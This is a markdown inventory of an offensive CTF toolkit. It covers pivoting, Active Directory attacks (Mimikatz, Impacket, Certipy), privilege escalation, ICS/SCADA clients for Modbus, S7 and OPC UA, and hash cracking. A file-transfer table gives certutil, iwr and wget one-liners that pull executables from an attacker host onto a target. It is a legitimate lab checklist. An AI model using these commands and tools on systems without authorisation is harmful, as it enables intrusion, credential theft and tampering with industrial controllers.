# CTF Tool List

Execution location legend: **A** = Attacker PC (Mac/Linux), **T** = Upload to target, **P** = Upload to pivot host

---

## 1. Pivoting & Tunneling

| Status | Tool | Execution Location | Required Architecture | Download | Notes |
|------|------|-----------|---------------|----------|------|
| :white_check_mark: | **chisel** | A + T | linux/{amd64,arm64}, windows/amd64, darwin/arm64 | https://github.com/jpillora/chisel/releases | Go static. All 4 architectures present in bins/ |
| :white_check_mark: | **ligolo-proxy** | A | darwin/arm64 | https://github.com/nicocha30/ligolo-ng/releases | bins/darwin-arm64/ |
| :white_check_mark: | **ligolo-agent** | T / P | linux/{amd64,arm64}, windows/amd64 | https://github.com/nicocha30/ligolo-ng/releases | 3 architectures present in bins/ |
| :white_check_mark: | **sshuttle** | A | Python (pip) | Installed in uv venv | sshuttle 1.3.2 |
| :white_check_mark: | **proxychains-ng** | A | brew | `brew install proxychains-ng` | proxychains4 4.17 |
| :white_check_mark: | **sshpass** | A | brew | `brew install hudochenkov/sshpass/sshpass` | sshpass 1.06 |
| :white_check_mark: | **socat** | T / P | linux/amd64 static | https://github.com/andrew-d/static-binaries | bins/linux-amd64/ (no static arm64 build available) |

### bins/ Status

```
bins/
├── linux-amd64/
│   ├── chisel           ✅ 10M
│   ├── ligolo-agent     ✅ 6.8M
│   └── socat            ✅ 368K
├── linux-arm64/
│   ├── chisel           ✅ 9.4M
│   ├── ligolo-agent     ✅ 6.4M
│   └── socat            ❌ (no static arm64 build available)
├── windows-amd64/
│   ├── chisel.exe       ✅ 10M
│   └── ligolo-agent.exe ✅ 7.0M
└── darwin-arm64/
    ├── chisel           ✅ 9.6M
    ├── ligolo-proxy     ✅ 19M
    └── kerbrute         ✅ 8.3M
```

---

## 2. Active Directory

### Attacker PC (Python — installed in venv)

| Status | Tool | Installation | Purpose |
|------|------|------|------|
| :white_check_mark: | **Impacket** | uv venv (0.14.0.dev) | psexec, wmiexec, secretsdump, GetNPUsers, GetUserSPNs, mssqlclient, etc. |
| :white_check_mark: | **BloodHound.py** | uv venv (1.9.1) | AD ingestor (runs from non-domain-joined host) |
| :white_check_mark: | **enum4linux-ng** | uv venv (1.3.10, git) | SMB/RPC/LDAP enumeration |
| :white_check_mark: | **NetExec (nxc)** | uv venv (1.5.1, git) | SMB/WinRM/MSSQL enumeration and attacks |
| :white_check_mark: | **Certipy** | uv venv (5.0.4, git) | AD CS enumeration and attacks |
| :x: | **Responder** | `pip install responder` or git clone | LLMNR/NBT-NS poisoning |
| :white_check_mark: | **evil-winrm** | Ruby gem (/usr/local/bin) | WinRM shell (Pass-the-Hash support) |
| :white_check_mark: | **ldapsearch** | OS built-in | LDAP queries |
| :white_check_mark: | **rpcclient** | Samba (brew) | RPC enumeration |
| :white_check_mark: | **adidnsdump** | uv venv (1.4.0) | DNS record dump |
| :x: | **windapsearch** | Go binary or Python | LDAP enumeration (can be replaced by ldapsearch) |

### Target Upload (Windows) — bins/windows-amd64/

| Status | Tool | Download | Purpose |
|------|------|----------|------|
| :white_check_mark: | **SharpHound.exe** | https://github.com/SpecterOps/SharpHound/releases | AD data collection for BloodHound |
| :x: | **Rubeus.exe** | https://github.com/GhostPack/Rubeus (build required) | Kerberos attacks (Roasting, delegation, etc.) |
| :white_check_mark: | **Mimikatz** | https://github.com/gentilkiwi/mimikatz/releases | mimikatz.exe + mimilib.dll (x64) |
| :white_check_mark: | **PowerView.ps1** | https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon | AD situational awareness |
| :x: | **Certify.exe** | https://github.com/GhostPack/Certify (build required) | AD CS enumeration |
| :white_check_mark: | **Inveigh.exe** | https://github.com/Kevin-Robertson/Inveigh/releases | Windows Responder alternative (.NET 4.6.2) |
| :white_check_mark: | **Snaffler.exe** | https://github.com/SnaffCon/Snaffler/releases | File share credential discovery |

### bins/ Status

```
bins/windows-amd64/
├── SharpHound.exe       ✅ 1.3M
├── mimikatz/
│   ├── mimikatz.exe     ✅ 1.3M
│   └── mimilib.dll      ✅ 40K
├── PowerView.ps1        ✅ 756K
├── Inveigh.exe          ✅ 1.7M
├── Snaffler.exe         ✅ 484K
├── Rubeus.exe           ❌ (build required)
└── Certify.exe          ❌ (build required)
```

---

## 3. Privilege Escalation

| Status | Tool | Execution Location | Download | Purpose |
|------|------|-----------|----------|------|
| :white_check_mark: | **linPEAS.sh** | T (Linux) | https://github.com/peass-ng/PEASS-ng/releases | bins/linux-{amd64,arm64}/ |
| :white_check_mark: | **winPEAS.exe** | T (Win) | https://github.com/peass-ng/PEASS-ng/releases | bins/windows-amd64/ (11M) |
| :white_check_mark: | **pspy** | T (Linux) | https://github.com/DominicBreuker/pspy/releases | bins/linux-amd64/ (amd64 only, no arm64 build) |
| :white_check_mark: | **PrintSpoofer.exe** | T (Win) | https://github.com/itm4n/PrintSpoofer/releases | bins/windows-amd64/ |
| :white_check_mark: | **GodPotato.exe** | T (Win) | https://github.com/BeichenDream/GodPotato/releases | bins/windows-amd64/ (.NET4) |

### bins/ Status

```
bins/
├── linux-amd64/
│   ├── linpeas.sh       ✅ 1.0M
│   └── pspy64           ✅ 3.0M
├── linux-arm64/
│   ├── linpeas.sh       ✅ 1.0M
│   └── pspy-arm64       ❌ (no build available)
└── windows-amd64/
    ├── winPEASx64.exe   ✅ 11M
    ├── PrintSpoofer64.exe ✅ 28K
    └── GodPotato.exe    ✅ 56K
```

---

## 4. SCADA / ICS

### Python Libraries (installed in uv venv)

| Status | Library | Version | Protocol | Default Port | Purpose |
|------|-----------|------|----------|-----------|------|
| :white_check_mark: | **pymodbus** | 3.12.1 | Modbus TCP/RTU | 502 | Register read/write, Unit ID scan |
| :white_check_mark: | **asyncua** | 1.1.8 | OPC UA | 4840 | Node tree browsing, tag read/write |
| :white_check_mark: | **python-snap7** | 3.0.0 | S7comm (Siemens) | 102 | PLC DB read/write, CPU info |
| :white_check_mark: | **scapy** | 2.7.0 | General-purpose packet manipulation | - | DNP3, IEC104, BACnet raw packets, custom protocols |
| :white_check_mark: | **paho-mqtt** | 2.1.0 | MQTT | 1883/8883 | Topic subscribe/publish, broker enumeration |
| :white_check_mark: | **cpppo** | 5.2.5 | EtherNet/IP (CIP) | 44818 | Allen-Bradley low-level CIP communication |
| :white_check_mark: | **pycomm3** | 1.2.16 | EtherNet/IP (CIP) | 44818 | Allen-Bradley Logix tag read/write (high-level) |

### CLI Tools

| Status | Tool | Execution Location | Installation | Purpose |
|------|------|-----------|------|------|
| :white_check_mark: | **nmap modbus scripts** | A | nmap built-in | `--script modbus-discover` |
| :x: | **mbtget** | A | `cargo install mbtget` | CLI Modbus TCP client (can be replaced by pymodbus) |
| :x: | **ctmodbus** | A | https://github.com/tenable/ctmodbus | Modbus interactive (can be replaced by pymodbus) |

### Protocol Templates (`scripts/templates/`)

| File | Protocol | Library | Description |
|------|----------|-----------|------|
| `protocol_detect.py` | Auto-detection | socket (built-in) | Port+banner-based ICS protocol auto-detection, recommends next script |
| `modbus_tcp.py` | Modbus TCP | pymodbus | Unit ID scan, register dump, flag search, write |
| `opcua_client.py` | OPC UA | asyncua | Node tree browsing, value read/write, flag search |
| `s7comm_client.py` | S7comm | python-snap7 | CPU info, DB block scan, Marker read, flag search |
| `mqtt_client.py` | MQTT | paho-mqtt | Wildcard subscribe, topic collection, flag search |
| `enip_client.py` | EtherNet/IP | pycomm3/cpppo | PLC tag enumeration, read/write, flag search |
| `bacnet_scan.py` | BACnet/IP | socket (raw) | Who-Is discovery, Object enumeration, flag search |
| `dnp3_client.py` | DNP3 | socket (raw) | Address scan, Class 0/1/2/3 data request, flag search |
| `iec104_client.py` | IEC 104 | socket (raw) | STARTDT, General Interrogation, data parsing |

> SCADA tools access the network from the attacker PC, so no binary upload is needed.
> However, if pivoting is required, route through proxychains or sshuttle.
> All templates can be run with the format `uv run scripts/templates/<file> --host TARGET --json`.

---

## 5. Network & Recon

| Status | Tool | Execution Location | Installation | Purpose |
|------|------|-----------|------|------|
| :white_check_mark: | **nmap** | A | brew (7.99) | Port scanning, service detection |
| :white_check_mark: | **ncat** | A | Installed with nmap | Netcat alternative |
| :white_check_mark: | **smbmap** | A | uv venv (1.10.8) | SMB share enumeration |
| :white_check_mark: | **smbclient** | A | Samba (brew) | SMB file access |
| :white_check_mark: | **kerbrute** | A + T | bins/ darwin-arm64 + linux-amd64 + windows-amd64 | Kerberos user enumeration, password spraying |
| :white_check_mark: | **ffuf** | A | brew (2.1.0) | Web fuzzing (directories, parameters) |
| :x: | **gobuster** | A | `brew install gobuster` | Directory/DNS brute-force (can be replaced by ffuf) |
| :white_check_mark: | **curl** | A | OS built-in | HTTP requests, API testing |

### kerbrute bins/

```
bins/
├── linux-amd64/
│   └── kerbrute         ✅ 7.9M
├── darwin-arm64/
│   └── kerbrute         ✅ 8.3M
└── windows-amd64/
    └── kerbrute.exe     ✅ 8.0M
```

---

## 6. Hash Cracking

| Status | Tool | Execution Location | Installation | Purpose |
|------|------|-----------|------|------|
| :white_check_mark: | **hashcat** | A | brew (7.1.2) | GPU hash cracking |
| :white_check_mark: | **john** | A | brew | CPU hash cracking |
| :white_check_mark: | **rockyou.txt** | A | tools/wordlists/ (133M) | Default wordlist |
| :x: | **SecLists** | A | `git clone https://github.com/danielmiessler/SecLists` | Wordlists, fuzzing lists |

---

## 7. File Transfer (Target <-> Attacker)

| Method | Command | Notes |
|------|--------|------|
| **Python HTTP** | `python3 -m http.server 8888` | Attacker to target (wget/curl) |
| **smbserver.py** | `smbserver.py share ./bins` | Attacker to Windows target |
| **scp** | `scp file user@target:/tmp/` | When SSH is available |
| **certutil** (Win) | `certutil -urlcache -f http://IP:8888/file.exe file.exe` | Windows built-in |
| **PowerShell** (Win) | `iwr http://IP:8888/file.exe -OutFile file.exe` | Windows built-in |
| **wget** (Linux) | `wget http://IP:8888/file` | Installed on most Linux systems |
| **curl** (Linux) | `curl -o file http://IP:8888/file` | Installed on most Linux systems |

---

## Overall Status

| Category | Complete | Incomplete |
|----------|------|--------|
| Pivoting & Tunneling | 7/7 | — |
| AD (Attacker PC) | 9/11 | Responder, windapsearch |
| AD (Target Upload) | 5/7 | Rubeus (build required), Certify (build required) |
| Privilege Escalation | 5/5 | — |
| SCADA / ICS Libraries | 7/7 | — |
| SCADA / ICS CLI | 1/3 | mbtget, ctmodbus (can be replaced by pymodbus) |
| SCADA Templates | 9/9 | — |
| Network & Recon | 7/8 | gobuster (can be replaced by ffuf) |
| Hash Cracking | 3/4 | SecLists |

**Installed: 47 / Not Installed: 6**

### Not Installed

| Tool | Reason | Alternative |
|------|------|------|
| **Rubeus.exe** | Requires Visual Studio build | Impacket GetUserSPNs.py / GetNPUsers.py |
| **Certify.exe** | Requires Visual Studio build | Certipy (Python, installed in venv) |
| **Responder** | Requires separate installation | Some functionality included in NetExec |
| **windapsearch** | Requires separate installation | Can be replaced by ldapsearch |
| **gobuster** | Not installed | Fully replaceable by ffuf |
| **SecLists** | Requires large (~2GB) git clone | rockyou.txt is ready |
